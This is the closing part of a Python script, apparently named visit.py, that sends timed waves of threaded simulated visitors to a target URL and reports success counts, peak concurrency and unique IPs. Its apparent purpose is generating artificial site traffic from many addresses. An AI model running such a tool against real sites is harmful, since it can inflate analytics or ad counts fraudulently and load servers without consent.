    
    all_threads = []
    for wave in range(total_waves):
        if stop_event.is_set():
            break
        wave_threads = run_wave(wave, site_info)
        all_threads.extend(wave_threads)
        
        if wave < total_waves - 1:
            print(f"  ⏳ Next wave in {WAVE_INTERVAL}s... "
                  f"(👥 {stats['active_visitors']} active)", flush=True)
            for _ in range(WAVE_INTERVAL):
                if stop_event.is_set():
                    break
                time.sleep(1)
    
    # Wait for last wave
    print("\n⏳ Waiting for last visitors...", flush=True)
    for t in all_threads[-WAVE_SIZE:]:
        t.join(timeout=STAY_TIME + 10)
    
    write_status()
    t = time.time() - stats["start_time"]
    print(f"\n{'='*60}", flush=True)
    print(f"🏁 DONE! ✅{stats['success']}/{total_visits} ❌{stats['failed']}", flush=True)
    if t > 0:
        print(f"⏱️ {t:.0f}s ({int(t//60)}m{int(t%60)}s) | "
              f"🚀{stats['success']/t*60:.0f}/min", flush=True)
    print(f"Mode: {site_info['mode']} | Peak: {stats['peak_active']} active", flush=True)
    print(f"🌍 {stats['unique_ips']} unique IPs", flush=True)
    print(f"{'='*60}", flush=True)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 visit.py <URL> [duration_minutes] [socket_url]")
        sys.exit(1)
    target_url = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    manual_socket = sys.argv[3] if len(sys.argv) > 3 else os.environ.get("SOCKET_URL", "")
    run(target_url, duration, manual_socket=manual_socket if manual_socket else None)
